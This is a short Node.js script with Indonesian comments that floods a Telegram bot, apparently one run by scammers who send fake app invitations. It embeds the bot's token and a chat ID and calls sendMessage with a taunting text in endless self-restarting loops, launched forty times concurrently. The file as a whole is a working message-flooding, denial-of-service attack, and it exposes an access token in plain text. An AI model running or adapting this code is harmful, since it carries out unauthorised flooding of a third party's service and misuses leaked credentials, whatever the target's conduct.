const { default: axios } = require("axios");

const url =
  "https://api.telegram.org/bot7063902404:AAEE6TJqVfohmlkeUHbrByKVRuF8RDFcSzE/sendMessage?parse_mode=markdown&chat_id=7080400074&text=wkwkw%20masih%20jaman%20kahh%20nipu%20pake%20undangan%20aplikasi%20.pdf 🤣🤣🤣🤣😂😂😂";

async function sendMessage() {
  try {
    while (true) {
      await axios.get(url).then((response) => {
        if (response.status == 200) {
          console.log("Okee Meluncurrr... ✈️✈️");
        }
      });
    }
  } catch (error) {
    console.log("API PENIPU DOWN WKWKWKWK !!! 🤣🤣🤣");
    sendMessage();
  }
}

sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
